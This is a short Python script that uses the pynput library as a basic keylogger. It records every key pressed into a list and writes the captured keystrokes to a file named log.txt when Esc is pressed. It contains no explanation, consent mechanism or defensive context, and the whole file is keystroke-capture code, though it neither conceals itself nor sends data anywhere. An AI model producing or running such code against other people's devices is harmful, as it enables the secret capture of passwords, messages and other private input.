from pynput import keyboard

keys = []

def main():
	with keyboard.Listener(on_press=press, on_release=release) as listener:
		listener.join()
	with open('log.txt', 'w') as f:
		f.write(str(keys))

def press(key):
	try:
		keys.append(key.char)
	except AttributeError:
		keys.append(key)

def release(key):
    if(key == keyboard.Key.esc):
    	exit()

if __name__ == '__main__':
	main()
